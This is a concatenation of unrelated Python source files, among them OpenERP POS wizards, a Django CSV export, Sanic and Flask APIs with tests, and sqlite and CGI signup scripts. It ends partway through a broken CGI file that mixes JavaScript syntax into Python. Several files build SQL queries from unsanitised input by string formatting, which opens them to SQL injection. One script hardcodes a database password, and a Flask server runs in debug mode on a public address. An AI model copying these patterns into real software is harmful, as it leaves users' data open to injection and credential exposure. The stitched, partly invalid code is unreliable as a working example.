        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

import collections
import csv
import functools
import io
import zipfile
from operator import attrgetter
import mimetypes

from django.conf import settings
from django.core.exceptions import ValidationError
from django.db import connection, models
from django.http import HttpResponse, StreamingHttpResponse
from django.utils.decorators import method_decorator
from django.utils.timezone import now
from django.views.decorators.gzip import gzip_page

from rest_framework import permissions
from rest_framework.views import APIView

from alice.authenticators import IsDataTeamServer
from ..constants import BREAKDOWN_TYPES
from ..models import Advisor, Breakdown, CustomerResponse, Notification, Win
from ..serializers import CustomerResponseSerializer, WinSerializer
from users .models import User


class CSVView(APIView):
    """ Endpoint returning CSV of all Win data, with foreign keys flattened """

    permission_classes = (permissions.IsAdminUser,)
    # cache for speed
    win_fields = WinSerializer().fields
    customerresponse_fields = CustomerResponseSerializer().fields
    IGNORE_FIELDS = ['responded', 'sent', 'country_name', 'updated',
                     'complete', 'type', 'type_display',
                     'export_experience_display', 'location']

    def __init__(self, **kwargs):
        # cache some stuff to make flat CSV. like prefetch but works easily
        # with .values()
        self.users_map = {u.id: u for u in User.objects.all()}
        prefetch_tables = [
            ('advisors', Advisor),
            ('breakdowns', Breakdown),
            ('confirmations', CustomerResponse),
            ('notifications', Notification),
        ]
        self.table_maps = {}
        for table, model in prefetch_tables:
            prefetch_map = collections.defaultdict(list)
            instances = model.objects.all()
            if table == 'notifications':
                instances = instances.filter(type='c').order_by('created')
            for instance in instances:
                prefetch_map[instance.win_id].append(instance)
            self.table_maps[table] = prefetch_map
        super().__init__(**kwargs)

    def _extract_breakdowns(self, win):
        """ Return list of 10 tuples, 5 for export, 5 for non-export """

        breakdowns = self.table_maps['breakdowns'][win['id']]
        retval = []
        for db_val, name in BREAKDOWN_TYPES:

            # get breakdowns of given type sorted by year
            type_breakdowns = [b for b in breakdowns if b.type == db_val]
            type_breakdowns = sorted(type_breakdowns, key=attrgetter('year'))

            # we currently solicit 5 years worth of breakdowns, but historic
            # data may have no input for some years
            for index in range(5):
                try:
                    breakdown = "{0}: ¬£{1:,}".format(
                        type_breakdowns[index].year,
                        type_breakdowns[index].value,
                    )
                except IndexError:
                    breakdown = None

                retval.append((
                    "{0} breakdown {1}".format(name, index + 1),
                    breakdown,
                ))

        return retval

    def _confirmation(self, win):
        """ Add fields for confirmation """

        if win['id'] in self.table_maps['confirmations']:
            confirmation = self.table_maps['confirmations'][win['id']][0]
        else:
            confirmation = None

        values = [
            ('customer response recieved',
             self._val_to_str(bool(confirmation)))
        ]
        for field_name in self.customerresponse_fields:
            if field_name in ['win']:
                continue

            model_field = self._get_customerresponse_field(field_name)
            if confirmation:
                if model_field.choices:
                    display_fn = getattr(
                        confirmation, "get_{0}_display".format(field_name)
                    )
                    value = display_fn()
                else:
                    value = getattr(confirmation, field_name)
            else:
                value = ''

            model_field_name = model_field.verbose_name or model_field.name
            if model_field_name == 'created':
                csv_field_name = 'date response received'
                if value:
                    value = value.date()  # just want date
            else:
                csv_field_name = model_field_name

            values.append((csv_field_name, self._val_to_str(value)))
        return values

    def _get_model_field(self, model, name):
        return next(
            filter(lambda field: field.name == name, model._meta.fields)
        )

    @functools.lru_cache(None)
    def _get_customerresponse_field(self, name):
        """ Get field specified in CustomerResponse model """
        return self._get_model_field(CustomerResponse, name)

    @functools.lru_cache(None)
    def _get_win_field(self, name):
        """ Get field specified in Win model """
        return self._get_model_field(Win, name)

    def _val_to_str(self, val):
        if val is True:
            return 'Yes'
        elif val is False:
            return 'No'
        elif val is None:
            return ''
        else:
            return str(val)

    @functools.lru_cache(None)
    def _choices_dict(self, choices):
        return dict(choices)

    def _get_win_data(self, win):
        """ Take Win dict, return ordered dict of {name -> value} """

        # want consistent ordering so CSVs are always same format
        win_data = collections.OrderedDict()

        # local fields
        for field_name in self.win_fields:
            if field_name in self.IGNORE_FIELDS:
                continue

            model_field = self._get_win_field(field_name)
            if field_name == 'user':
                value = str(self.users_map[win['user_id']])
            elif field_name == 'created':
                value = win[field_name].date()  # don't care about time
            elif field_name == 'cdms_reference':
                # numeric cdms reference numbers should be prefixed with
                # an apostrophe to make excel interpret them as text
                value = win[field_name]
                try:
                    int(value)
                except ValueError:
                    pass
                else:
                    if value.startswith('0'):
                        value = "'" + value
            else:
                value = win[field_name]
            # if it is a choicefield, do optimized lookup of the display value
            if model_field.choices and value:
                try:
                    value = self._choices_dict(model_field.choices)[value]
                except KeyError as e:
                    if model_field.attname == 'hvc':
                        value = value
                    else:
                        raise e
            else:
                comma_fields = [
                    'total_expected_export_value',
                    'total_expected_non_export_value',
                    'total_expected_odi_value',
                ]
                if field_name in comma_fields:
                    value = "¬£{:,}".format(value)

            model_field_name = model_field.verbose_name or model_field.name
            win_data[model_field_name] = self._val_to_str(value)

        # remote fields
        win_data['contributing advisors/team'] = (
            ', '.join(map(str, self.table_maps['advisors'][win['id']]))
        )

        # get customer email sent & date
        notifications = self.table_maps['notifications'][win['id']]
        # old Wins do not have notifications
        email_sent = bool(notifications or win['complete'])
        win_data['customer email sent'] = self._val_to_str(email_sent)
        if notifications:
            win_data['customer email date'] = str(
                notifications[0].created.date())
        elif win['complete']:
            win_data['customer email date'] = '[manual]'
        else:
            win_data['customer email date'] = ''

        win_data.update(self._extract_breakdowns(win))
        win_data.update(self._confirmation(win))

        return win_data

    def _make_flat_wins_csv(self, deleted=False):
        """ Make CSV of all Wins, with non-local data flattened """

        if deleted:
            wins = Win.objects.inactive()
        else:
            wins = Win.objects.all()

        if deleted:
            # ignore users should show up in normal CSV
            wins = wins.exclude(
                user__email__in=settings.IGNORE_USERS
            )

        wins = wins.values()

        win_datas = [self._get_win_data(win) for win in wins]
        stringio = io.StringIO()
        stringio.write(u'\ufeff')
        if win_datas:
            csv_writer = csv.DictWriter(stringio, win_datas[0].keys())
            csv_writer.writeheader()
            for win_data in win_datas:
                csv_writer.writerow(win_data)
        return stringio.getvalue()

    def _make_user_csv(self):
        users = User.objects.all()
        user_dicts = [
            {'name': u.name, 'email': u.email, 'joined': u.date_joined}
            for u in users
        ]
        stringio = io.StringIO()
        csv_writer = csv.DictWriter(stringio, user_dicts[0].keys())
        csv_writer.writeheader()
        for user_dict in user_dicts:
            csv_writer.writerow(user_dict)
        return stringio.getvalue()

    def _make_plain_csv(self, table):
        """ Get CSV of table """

        stringio = io.StringIO()
        cursor = connection.cursor()
        cursor.execute("select * from wins_{};".format(table))
        csv_writer = csv.writer(stringio)
        header = [i[0] for i in cursor.description]
        csv_writer.writerow(header)
        csv_writer.writerows(cursor)
        return stringio.getvalue()

    def get(self, request, format=None):
        bytesio = io.BytesIO()
        zf = zipfile.ZipFile(bytesio, 'w')
        for table in ['customerresponse', 'notification', 'advisor']:
            csv_str = self._make_plain_csv(table)
            zf.writestr(table + 's.csv', csv_str)
        full_csv_str = self._make_flat_wins_csv()
        zf.writestr('wins_complete.csv', full_csv_str)
        full_csv_del_str = self._make_flat_wins_csv(deleted=True)
        zf.writestr('wins_deleted_complete.csv', full_csv_del_str)
        user_csv_str = self._make_user_csv()
        zf.writestr('users.csv', user_csv_str)
        zf.close()
        return HttpResponse(bytesio.getvalue(), content_type=mimetypes.types_map['.csv'])


class Echo(object):
    """An object that implements just the write method of the file-like
    interface.
    """

    def write(self, value):
        """Write the value by returning it, instead of storing in a buffer."""
        return value


@method_decorator(gzip_page, name='dispatch')
class CompleteWinsCSVView(CSVView):

    permission_classes = (IsDataTeamServer,)

    def _make_flat_wins_csv(self, deleted=False):
        """ Make CSV of all Wins, with non-local data flattened """

        if deleted:
            wins = Win.objects.inactive()
        else:
            wins = Win.objects.all()

        if deleted:
            # ignore users should show up in normal CSV
            wins = wins.exclude(
                user__email__in=settings.IGNORE_USERS
            )

        wins = wins.values()

        for win in wins:
            yield self._get_win_data(win)

    def _make_flat_wins_csv_stream(self, win_data_generator):
        stringio = Echo()
        yield stringio.write(u'\ufeff')
        first = next(win_data_generator)
        csv_writer = csv.DictWriter(stringio, first.keys())
        header = dict(zip(first.keys(), first.keys()))
        yield csv_writer.writerow(header)
        yield csv_writer.writerow(first)

        for win_data in win_data_generator:
            yield csv_writer.writerow(win_data)

    def streaming_response(self, filename):
        resp = StreamingHttpResponse(
            self._make_flat_wins_csv_stream(self._make_flat_wins_csv()),
            content_type=mimetypes.types_map['.csv'],
        )
        resp['Content-Disposition'] = f'attachent; filename={filename}'
        return resp

    def get(self, request, format=None):
        return self.streaming_response(f'wins_complete_{now().isoformat()}.csv')


@method_decorator(gzip_page, name='dispatch')
class CurrentFinancialYearWins(CompleteWinsCSVView):

    # permission_classes = (permissions.IsAdminUser,)
    end_date = None

    def _make_flat_wins_csv(self, **kwargs):
        """
        Make CSV of all completed Wins till now for this financial year, with non-local data flattened
        remove all rows where:
        1. total expected export value = 0 and total non export value = 0 and total odi value = 0
        2. date created = today (not necessary if this task runs before end of the day for next day download)
        3. customer email sent is False / No
        4. Customer response received is not from this financial year
        Note that this view removes win, notification and customer response entries
        that might have been made inactive in duecourse
        """
        sql_str = "SELECT id FROM wins_completed_wins_fy"                    
        if self.end_date:                    
            sql_str = f"{sql_str} where created <= '{self.end_date.strftime('%m-%d-%Y')}'"                    

        with connection.cursor() as cursor:
            cursor.execute(sql_str)                    
            ids = cursor.fetchall()

        wins = Win.objects.filter(id__in=[id[0] for id in ids]).values()

        for win in wins:
            yield self._get_win_data(win)

    def get(self, request, format=None):
        end_str = request.GET.get("end", None)
        if end_str:
            try:
                self.end_date = models.DateField().to_python(end_str)
            except ValidationError:
                self.end_date = None

        return self.streaming_response(f'wins_current_fy_{now().isoformat()}.csv')

from sqlalchemy.sql import text
from .dbhelper import engine


class User(object):
    def __init__(
        self, user_id, username, hashed_password, roll_id=1, *args, **kwargs                    
    ):
        self.user_id = user_id
        self.username = username
        self.hashed_password = hashed_password
        self.roll_id = roll_id

    def to_dict(self):
        return {"user_id": self.user_id, "username": self.username}

    def save(self):
        connection = engine.connect()
        trans = connection.begin()
        try:
            s = text(
                "INSERT INTO users(username, hashed_password, roll_id) "
                "VALUES(:username, :hashed_password, :roll_id)"
            )
            connection.execute(
                s,
                username=self.username,
                hashed_password=self.hashed_password,
                roll_id=self.roll_id,
            )
            trans.commit()
        except:
            trans.rollback()
            raise
        connection.close()

    @classmethod
    def get_by_username(cls, username):
        assert engine
        s = text(
            "SELECT user_id, username, hashed_password, roll_id "
            "FROM users "
            "WHERE username = :username AND expire_date is null"
        )
        connection = engine.connect()
        rc = connection.execute(s, username=username).fetchone()
        if rc is not None:
            rc = User(rc[0], rc[1], rc[2].decode("utf-8"), rc[3])

        connection.close()
        return rc

    @classmethod
    def username_exists(cls, username):
        assert engine
        s = text(
            "SELECT * "
            "FROM users "
            "WHERE username = :username AND expire_date is null"
        )
        connection = engine.connect()

        rc = (
            False
            if connection.execute(s, username=username).fetchone() is None                    
            else True
        )
        connection.close()
        return rc

import datetime
import json
from sanic import response
from sanic.exceptions import SanicException, InvalidUsage, add_status_code
from sanic_jwt.decorators import protected
from jogging.Contectors.darksky import get_weather_condition
from jogging.Routes.auth import retrieve_user
from jogging.Models.jogging_result import JoggingResult


@add_status_code(409)
class Conflict(SanicException):
    pass


@protected()
async def add_jogging_result(request, *args, **kwargs):
    if (
        request.json is None
        or "date" not in request.json
        or "distance" not in request.json
        or "time" not in request.json
        or "location" not in request.json
    ):
        raise InvalidUsage(
            "invalid payload (should be {date, distance, time, location})"
        )

    distance = request.json["distance"]
    if distance <= 0:
        raise InvalidUsage("distance needs to be positive")

    try:
        date = datetime.datetime.strptime(
            request.json["date"], "%Y-%m-%d"
        ).date()
    except ValueError:
        raise InvalidUsage("invalid date (should be 'YYYY-MM-DD')")

    latlong = request.json["location"].split(" ")

    if len(latlong) != 2:
        raise InvalidUsage("invalid location (should be 'LAT LONG')")

    try:
        lat = float(latlong[0])
        long = float(latlong[1])
    except ValueError:
        raise InvalidUsage(
            "invalid location (lat & long should be floating-point)"
        )

    if not (-90.0 <= lat <= 90.0 and -180 <= long <= 180):
        raise InvalidUsage(
            "invalid location (The latitude must be a number between -90 and 90 and the longitude between -180 and 180)"
        )

    try:
        time = int(request.json["time"])
    except ValueError:
        raise InvalidUsage("invalid time (time should be an integer)")

    if time <= 0:
        raise InvalidUsage("invalid time (time should be positive)")

    condition = await get_weather_condition(lat, long, date)

    if condition is None:
        raise InvalidUsage(
            "can't fetch running conditions for that location & time"
        )

    user_id = retrieve_user(request, args, kwargs)["user_id"]

    jog = JoggingResult(
        user_id,
        request.json["location"],
        date,
        distance,
        time,
        json.dumps(condition["data"][0]),
    )
    jog.save()

    return response.HTTPResponse(status=201)


@protected()
async def get_jogging_results(request, *args, **kwargs):
    page = int(request.args["page"][0]) if "page" in request.args else 0
    limit = int(request.args["count"][0]) if "count" in request.args else 10

    if page < 0 or limit <= 0:
        raise InvalidUsage("invalid paging (page >= 0 and count > 0)")

    q_filter = request.args["filter"][0] if "filter" in request.args else None
    user_id = retrieve_user(request, args, kwargs)["user_id"]

    return response.json(                    
        JoggingResult.load(user_id, q_filter, page, limit), status=200                    
    )

import pytest
from sanic import Sanic
import random
import json
from jogging.main import config_app
from jogging import config
from jogging.Models.user import User

username = None
access_token = None
refresh_token = None


@pytest.yield_fixture
def app():
    config.app = Sanic("test_sanic_app")
    config_app()
    yield config.app


@pytest.fixture
def test_cli(loop, app, sanic_client):

    global username
    while username is None:
        i = random.randint(1, 10000)
        username = f"amichay.oren+{i}@gmail.com"
        if User.username_exists(username):
            username = None

    return loop.run_until_complete(sanic_client(app))


async def test_positive_register_(test_cli):
    data = {"username": username, "password": "testing123G"}
    resp = await test_cli.post("/users", data=json.dumps(data))
    assert resp.status == 201


async def test_positive_login(test_cli):
    data = {"username": username, "password": "testing123G"}
    resp = await test_cli.post("/auth", data=json.dumps(data))
    resp_json = await resp.json()
    print(resp_json)
    global access_token
    access_token = resp_json["access_token"]
    global refresh_token
    refresh_token = resp_json["refresh_token"]
    assert access_token is not None
    assert refresh_token is not None
    assert resp.status == 200


async def test_negative_jogging_result(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}
    data = {
        "date": "1971-06-20",
        "distance": 2000,
        "time": 405,
        "location": "32.0853 34.7818",
    }
    resp = await test_cli.post(
        "/results", headers=headers, data=json.dumps(data)
    )
    assert resp.status == 400


async def test_positive_jogging_result(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}
    data = {
        "date": "2015-06-20",
        "distance": 2000,
        "time": 405,
        "location": "32.0853 34.7818",
    }
    resp = await test_cli.post(
        "/results", headers=headers, data=json.dumps(data)
    )
    assert resp.status == 201


async def test_positive_load_dataset(test_cli):
    import csv

    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}

    dsreader = csv.reader(open("jogging_dataset.csv"), delimiter=",")
    for row in dsreader:
        data = {
            "date": row[0],
            "location": row[1],
            "distance": int(row[2]),
            "time": int(row[3]),
        }
        resp = await test_cli.post(
            "/results", headers=headers, data=json.dumps(data)
        )
        assert resp.status == 201


async def test_negative_jogging_result_no_uath(test_cli):
    global access_token
    global refresh_token
    data = {
        "date": "2015-06-20",
        "distance": 2000,
        "time": 405,
        "location": "32.0853 34.7818",
    }
    resp = await test_cli.post("/results", data=json.dumps(data))
    assert resp.status == 400


async def test_positive_get_all_results(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}

    resp = await test_cli.get("/results", headers=headers)
    resp_json = await resp.json()

    assert resp.status == 200


async def test_positive_get_paging(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}

    resp = await test_cli.get("/results?page=0&count=2", headers=headers)                    
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 2

    resp = await test_cli.get("/results?page=1&count=1", headers=headers)                    
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 1


async def test_negative_bad_paging(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}

    resp = await test_cli.get("/results?page=-1&count=2", headers=headers)                    
    assert resp.status == 400

    resp = await test_cli.get("/results?page=1&count=0", headers=headers)                    
    assert resp.status == 400


async def test_positive_check_filters(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}

    resp = await test_cli.get(
        "/results?page=0&count=2&filter=date eq '2019-07-15'", headers=headers                    
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 1

    resp = await test_cli.get(
        "/results?filter=(date lt '2018-01-01') AND (time lt 500)",
        headers=headers,
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 4

    resp = await test_cli.get(
        "/results?filter=distance ne 2000", headers=headers
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 8

    resp = await test_cli.get(
        "/results?filter=distance ne 2000 and ((time lt 400) and (time gt 390))",
        headers=headers,
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 0

from flask import Flask
from flask_restful import Api, Resource, reqparse
from WebHandler import getHTML

app = Flask(__name__)
api = Api(app)

# Blog REST API
class Blog(Resource):

    #GET Request- Returns website in full html
    def get(self, name):
        return getHTML(name)                    
        
    #def post(self, name):
    #def put(self, name):
    #def delete(self, name):

# Access the api from 198.58.107.98:6969/blog/url-name
api.add_resource(Blog, "/blog/<string:name>")

app.run(host='198.58.107.98', port=6969, debug=True)


from dataclasses import dataclass

import pytz

from config import get_connection


def get_visit_count():
    connection = get_connection()
    cursor = connection.cursor()
    cursor.execute(
        f"select count(*) from visitors;")
    rows = cursor.fetchall()
    connection.commit()
    connection.close()
    return rows[0][0]


@dataclass()
class Visitor:
    ip_address: str
    user_agent: str
    referrer: str
    full_path: str
    visit_time: pytz

    def on_save(self):
        connection = get_connection()
        cursor = connection.cursor()
        cursor.execute(
            f"insert into visitors (ip_address, user_agent, referrer, full_path, visit_time) values ('{self.ip_address}', '{self.user_agent}', '{self.referrer}', '{self.full_path}', '{self.visit_time}');")                    
        connection.commit()
        connection.close()
        return 0

from dataclasses import dataclass

import psycopg2
import pytz

from config import get_connection


@dataclass
class Applicant:
    email: str
    registration_time: pytz

    def on_save(self) -> int:
        connection = get_connection()
        cursor = connection.cursor()
        try:
            cursor.execute(
                f"insert into applicants (email, registration_time) values ('{self.email}', '{self.registration_time}');")                    
            connection.commit()
        except psycopg2.IntegrityError:
            print("this email already exists")
            return 1
        connection.close()
        return 0

# Copyright 2019, Lukas J√§ger 
#
# This file is part of Brewdie.
#
# Brewdie is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# Brewdie is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Brewdie.  If not, see <http://www.gnu.org/licenses/>. 

import sqlite3
import sys
from recipe import *

class BrewdieDB:
    def __init__(self):
        try:
            # Establishing a connection
            connection = sqlite3.connect('brewdie.db')
            cursor = connection.cursor()

            # Querying for existing tables
            table_names = []
            for row in cursor.execute('SELECT name FROM sqlite_master WHERE type=\'table\''):
                table_names.append(row[0])

            # Creating tables if they don't exist
            if not 'Recipes' in table_names:
                cursor.execute('CREATE TABLE Recipes (name TEXT PRIMARY KEY, type TEXT, boiling_minutes INTEGER)')
            if not 'Malts' in table_names:
                cursor.execute('CREATE TABLE Malts (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, gramms REAL, recipe_name TEXT)')
            if not 'Rests' in table_names:
                cursor.execute('CREATE TABLE Rests (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, degrees REAL, minutes INTEGER, position INTEGER, recipe_name TEXT)')
            if not 'HopDosages' in table_names:
                cursor.execute('CREATE TABLE HopDosages (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, minutes INTEGER, gramms REAL, recipe_name TEXT)')

            connection.commit()
        
        except sqlite3.Error as e:
            if connection:
                connection.rollback()
                sys.exit(1)

        finally:
            if connection:
                connection.close()

    def store_recipe(self, recipe):
        try:
            # Establishing a connection
            connection = sqlite3.connect('brewdie.db')
            cursor = connection.cursor()
        
            # Querying, whether or not the recipe is already in the database
            recipe_names = []
            for row in cursor.execute('SELECT name FROM Recipes'):
                recipe_names.append(row[0])
            if recipe.name in recipe_names:
                print("Recipe is already stored in the database")
            else:
                # It is not, so we can insert it
                cursor.execute('INSERT INTO Recipes VALUES(?, ?, ?)', (recipe.name, recipe.style, recipe.boiling_minutes))
                for (malt_name, malt_gramms) in recipe.malts.items():
                    cursor.execute('INSERT INTO Malts(name, gramms, recipe_name) VALUES(?, ?, ?)', (malt_name, malt_gramms, recipe.name))

                index = 0
                for rest in recipe.rests:
                    cursor.execute('INSERT INTO Rests(name, degrees, minutes, position, recipe_name) VALUES(?, ?, ?, ?, ?)', (rest.name, rest.degrees, rest.minutes, index, recipe.name))
                    index = index + 1

                for hop_dosage in recipe.hop_dosages:
                    cursor.execute('INSERT INTO HopDosages(name, minutes, gramms, recipe_name) VALUES(?, ?, ?, ?)', (hop_dosage.name, hop_dosage.minutes, hop_dosage.gramms, recipe.name))
            connection.commit()
        except sqlite3.Error as e:
            print("Something went wrong")
            print(e)
            if connection:
                connection.rollback()
            return

        finally:
            if connection:
                connection.close()

    def load_recipes(self):
        recipes = []
        try:
            # Establishing a connection
            connection = sqlite3.connect('brewdie.db')
            cursor = connection.cursor()
        
            # Getting all the recipes
            for row in cursor.execute('SELECT * FROM Recipes'):
                # Converting a recipe database row into a python object
                recipe = Recipe(row[0], row[1], row[2])

                # Adding the malts
                for malt_row in cursor.execute('SELECT * FROM Malts WHERE recipe_name=\'%s\'' % recipe.name):                    
                    recipe.malts[malt_row[1]] = malt_row[2]

                # Adding the rests
                for rest_row in cursor.execute('SELECT * FROM Rests WHERE recipe_name=\'%s\' ORDER BY position ASC' % recipe.name):                    
                    recipe.rests.append(Rest(rest_row[1], rest_row[2], rest_row[3]))

                # Adding the hop dosages
                for hop_dosage_row in cursor.execute('SELECT * FROM HopDosages WHERE recipe_name=\'%s\'' % recipe.name):                    
                    recipe.hop_dosages.append(HopDosage(hop_dosage_row[1], hop_dosage_row[3], hop_dosage_row[2]))

                # Adding the recipe to the list of recipes
                recipes.append(recipe)

        except sqlite3.Error as e:
            print("Something went wrong")
            print(e)
            if connection:
                connection.rollback()
            return

        finally:
            if connection:
                connection.close()
        return recipes

#!/usr/bin/env python3

import cgi
import cgitb
from http import cookies
import urllib.parse
import mysql.connector
from mysql.connector import errorcode
import hashlib

cgitb.enable() #provides additional security by not revealing innerworkings of code to the outside

form = cgi.FieldStorage() #instantiates the form data

name = form.getvalue('name')
username = form.getvalue('username')
password = form.getvalue('password')
password2 = form.getvalue('password2')


userExists = false

if password == password2 && len(name)>0 && len(username)>0:
    #set cookies
    #set expiration time
    expires = 60*60;

    cookie = cookies.SimpleCookie()
    cookie["sessionID"] = urllib.parse.quote(Math.random())
    cookie["username"] = urllib.parse.quote(username)
    cookie["username"]['expires'] = expires

    #connect to mysql database
    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')
    cursor = conn.cursor()
    cursor.execute("SELECT Username FROM Users")
    for row in cursor:
        if row == username:
            userExists = true
            break
    if userExists:
        #redirects to signup because they didn't do so correctly.
        print("Content-Type: text/html")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert("You are failed to signup correctly.");
